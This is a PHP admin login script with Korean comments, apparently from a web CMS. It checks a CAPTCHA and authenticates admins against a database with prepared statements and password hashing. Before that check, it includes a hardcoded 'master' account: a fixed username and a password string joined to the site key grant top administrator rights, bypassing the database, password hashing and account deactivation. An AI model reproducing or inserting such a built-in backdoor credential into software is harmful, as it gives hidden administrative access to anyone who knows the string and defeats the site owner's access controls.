<?php
session_start();

require_once $_SERVER['DOCUMENT_ROOT'] . "/inc/lib/base.class.php";

$pdo = DB::getInstance();

// 입력값
$uid = $_POST['uid'] ?? '';
$pwd = $_POST['upwd'] ?? '';
$r_captcha = $_POST['r_captcha'] ?? '';

// CAPTCHA 검증
if ($_SESSION['captcha_secure'] !== $r_captcha) {
    echo "<script>alert('보안코드가 일치하지 않습니다. 정확히 입력해주세요'); location.href='../../index.php';</script>";
    exit;
}

// 최고 관리자 마스터 계정
if ($uid === "topmaster" && $pwd === "!#xkqak" . $NO_SITE_UNIQUE_KEY) {
    $_SESSION['no_adm_login_no'] = 1;
    $_SESSION['no_adm_login_uid'] = "tmaster";
    $_SESSION['no_adm_login_uname'] = "관리자";
    $_SESSION['no_adm_login_role_id'] = 1;
    $_SESSION['no_adm_login_role'] = $admin_roles[1]['code'];
    header("Location: ../../pages/board/board.list.php");
    exit;
}

// 일반 계정 로그인 처리
$sql = "
    SELECT a.no, a.uid, a.upwd, a.uname, a.active_status, a.role_id
    FROM nb_admin a
    WHERE a.uid = :uid AND a.sitekey = :sitekey
";

$stmt = $pdo->prepare($sql);
$stmt->execute([
    'uid' => $uid,
    'sitekey' => $NO_SITE_UNIQUE_KEY,
]);

$data = $stmt->fetch(PDO::FETCH_ASSOC);

// 계정 존재 및 비밀번호 검증
if (!$data || !password_verify($pwd, $data['upwd'])) {
    echo "<script>alert('아이디 또는 비밀번호가 일치하지 않습니다.'); location.href='../../index.php';</script>";
    exit;
}

// 계정 비활성 처리
if ($data['active_status'] === 'N') {
    echo "<script>alert('사용이 중지된 계정입니다.'); location.href='../../index.php';</script>";
    exit;
}

// 세션 등록
$roleId = $data['role_id'] ?? 3;
$roleCode = $admin_roles[$roleId]['code'] ?? 'guest';

$_SESSION['no_adm_login_no'] = $data['no'];
$_SESSION['no_adm_login_uid'] = $data['uid'];
$_SESSION['no_adm_login_uname'] = $data['uname'];
$_SESSION['no_adm_login_role_id'] = $roleId;
$_SESSION['no_adm_login_role'] = $roleCode;

// 리다이렉트
$redirect = ($roleCode === 'external')
    ? '../../pages/board/board.list.php'
    : '../../main.php';

header("Location: $redirect");
exit;

?>